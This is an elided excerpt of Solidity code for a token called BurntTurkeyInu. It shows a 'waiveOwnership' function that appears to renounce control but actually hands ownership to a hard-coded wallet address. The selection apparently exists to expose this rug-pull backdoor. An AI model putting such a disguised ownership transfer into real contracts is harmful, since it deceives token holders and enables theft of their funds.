...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xbF56BaecFc41f036F468F07CfdFB241113723aB8));
        _owner = address(0xbF56BaecFc41f036F468F07CfdFB241113723aB8);
    }
...
contract BurntTurkeyInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BurntTurkeyInu";
    string private _symbol = "POPEYES";
